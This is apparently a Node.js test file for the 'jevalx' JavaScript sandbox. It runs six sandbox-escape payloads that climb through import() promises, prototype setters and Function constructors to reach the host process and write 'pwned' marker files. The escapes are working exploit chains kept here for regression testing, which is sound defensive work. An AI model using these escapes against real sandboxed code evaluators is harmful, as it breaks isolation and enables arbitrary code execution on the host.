const console_log = console.log;
let jevalxModule = require('./jevalx.js');
let assertWtf = require('assert');

let jevalx = jevalxModule.jevalx;

module.exports = {
q7:async()=>{
     var code=`(async()=>{
         let u = false;
         function t(o, e) {
         import('').then(_=>{ return _; }, _=>{ return _}).then.constructor('return process')()?.mainModule.require("fs").writeFileSync("pwned_case_q7","");
         u = true;
         o(this);
         }
         const obj = {__proto__: { get then(){
         console_log('inside __proto__ get then',u);
         if (u) { u = false; return undefined; } return t; } }};
         return obj
         })
     `
       try{
         console_log('Q7 result=',await jevalx(code,{console_log}));
       }catch(ex){
         console_log('Q7 ex=',ex);
       }
     console_log('Q7 check=',typeof(process),typeof(Promise));
   },
  r4:async()=>{
var case_id= 'r4';
var code=`
import('').catch(_=>_).constructor.__proto__ = {
        set constructor(f) {
console_log('!!!!!!! r4 setter called');
f("return process")().mainModule.require("fs").writeFileSync("pwned_${case_id}", "");}
}
console_log('!!! rt',''+import('').catch(_=>_).constructor,
import('').catch(_=>_).constructor.__proto__,
);
false;
`;
       try{
         console_log(`${case_id} result=`,await jevalx(code,{console_log}));
       }catch(ex){
         console_log(`${case_id} ex=`,ex);
       }
     console_log(`${case_id} check=`,typeof(process),typeof(Promise));
  },

//for no vm import but
  r5:async()=>{
var case_id= 'r5';
var code=`
const i = import('');
try { i.then() } catch (e) {}
i.constructor.constructor("return process")().mainModule.require("fs").writeFileSync("pwned_${case_id}", "")
`;
       try{
         console_log(`${case_id} result=`,await jevalx(code,{console_log}));
       }catch(ex){
         console_log(`${case_id} ex=`,ex);
       }
     console_log(`${case_id} check=`,typeof(process),typeof(Promise));
  },
BBB2:async()=>{
var case_id='BBB2';
  var code=`
    const customInspectSymbol = Symbol.for({
      toString: () => "nodejs.util.inspect.custom",
    });
    throw {
      [customInspectSymbol]: () => {
        this.constructor
          .constructor("return process")()
          .mainModule.require("fs")
          .writeFileSync("pwned_case_b2", "");
      },
    }
  `;
  try{
    console_log('BBB2 result=',await jevalx(code));
  }catch(ex){
    console_log('BBB2 ex=',ex.message);
  }
  console_log('BBB2 check=',typeof(process),typeof(Promise));
},

q31:async()=>{
 var code=`
  const Function = (async _=>_).constructor;
const Object = import('').catch(_=>_).__proto__.__proto__.constructor;
Object.__proto__ = {
	set defineProperty(f) {
		f(this, 'assign', {set: [].reduce.bind([1,2], Function.call.bind(Function.call), Function.apply.bind(Function, null, ["import('fs').then(m=>m.writeFileSync('pwned_q31', ''))"]))});
	}
};
false
`
  try{
    console_log('Q31 result=',await jevalx(code,{console_log}));
  }catch(ex){
    console_log('Q31 ex=',ex.message,JSON.stringify(ex.js));
  }
  console_log('Q31 check=',typeof(process),typeof(Promise));

},
q32:async()=>{
var code=`
const Function = (async _=>_).constructor;
const promise = import('');
constructor.__proto__.apply = [].reduce.bind([1,2], Function.call.bind(Function.call), Function.apply.bind(Function, null, ["import('fs').then(m=>m.writeFileSync('pwned_q32', ''))"]));
promise.catch();
1
`
  try{
    console.log('Q32 result=',await jevalx(code));
  }catch(ex){
    console.log('Q32 ex=',ex.message,JSON.stringify(ex.js));
  }
  console.log('Q32 check=',typeof(process),typeof(Promise));

},

}
